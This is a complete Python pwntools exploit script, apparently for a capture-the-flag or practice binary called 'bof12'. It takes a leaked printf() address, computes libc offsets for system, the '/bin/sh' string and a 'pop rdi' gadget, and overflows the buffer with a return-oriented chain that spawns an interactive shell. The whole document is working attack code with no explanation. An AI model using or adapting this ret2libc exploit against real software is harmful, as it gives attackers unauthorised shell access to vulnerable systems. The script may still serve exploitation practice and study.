#!/usr/bin/python3
from pwn import *
  
p = process('./bof12')
  
p.recvuntil('printf() address : ')
printf_addr = p.recvuntil('\n')
printf_addr = int(printf_addr, 16)
  
sys_addr = printf_addr + (-66672)
binsh = printf_addr + (1275223)
poprdi = printf_addr + (-214782)
distance_to_returnAddr = 18
  
exploit = str.encode("A" * distance_to_returnAddr)
exploit += p64(poprdi)
exploit += p64(binsh)
exploit += p64(sys_addr)
p.send(exploit)

p.interactive()
